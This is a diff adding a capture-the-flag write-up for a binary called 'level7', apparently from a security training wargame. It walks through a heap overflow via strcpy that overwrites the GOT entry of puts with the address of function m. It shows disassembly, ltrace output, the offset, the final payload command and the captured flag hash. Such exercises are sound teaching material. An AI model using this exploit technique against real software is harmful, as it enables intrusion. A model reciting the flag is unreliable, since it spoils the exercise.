@@ -1,0 +1,74 @@
+for level7 there is 2 function : main m
+0x080484f4  m
+0x08048521  main
+
+main has 4 malloc 2 strcpy fopen  fgets puts
+m print the global c , after a use to time
+
+the program segfault with no argument, and 1 argument, but it works with 2 argument
+
+the 2 arguments are stored into mallocs with strcpy
+
+some mallocs are saved in the precedent malloc
+
+the address of the second malloc is saved at the end of the first malloc
+the address of the 4th malloc is savec at the end of the 3rd malloc
+
+by changing these address we will exploit the program
+
+ at the end of main we have a call to fopen fgets and puts
+   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
+	...
+   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
+   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
+   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+
+
+we have to call the function m after fgets have been called in main and filled the global variable c with the password
+
+we will use the call to puts and rewirte the address to jump to m funciton
+
+the first argument will  overflow and end with the adress of puts to rewrite on the second buffer
+the second  argument will be the adddress of "m" with the second strcpy it will write it where the first address wrote with overflow point(puts address)
+
+so it will overwrite puts address with m address
+
+objdump -R ./level7 
+...
+08049928 R_386_JUMP_SLOT   puts
+...
+
+the address of m is 0x080484f4
+
+we need the offset to overflow strcpy
+$ ltrace ./level7 '123456789011223344556677'
+__libc_start_main(0x8048521, 2, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                                                                            = 0x0804a008
+malloc(8)                                                                                                            = 0x0804a018
+malloc(8)                                                                                                            = 0x0804a028
+malloc(8)                                                                                                            = 0x0804a038
+strcpy(0x0804a018, "123456789011223344556677")                                                                       = 0x0804a018
+strcpy(0x37373636, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+0x37373636 is the offset 20
+
+so we write the address of puts jump at the offset 202
+
+$ ltrace ./level7 $(python -c 'print("A"*20+"\x08\x04\x99\x28"[::-1])')
+__libc_start_main(0x8048521, 2, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                                                                            = 0x0804a008
+malloc(8)                                                                                                            = 0x0804a018
+malloc(8)                                                                                                            = 0x0804a028
+malloc(8)                                                                                                            = 0x0804a038
+strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAA(\231\004\b")                                                                = 0x0804a018
+strcpy(0x08049928, NULL <unfinished ...>    /!\ it worked we will strcpy  to puts jmp address
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+
+so now we write the address of m at this location
+
+./level7 $(python -c 'print("A"*20+"\x08\x04\x99\x28"[::-1])') $(python -c 'print("\x08\x04\x84\xf4"[::-1])')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
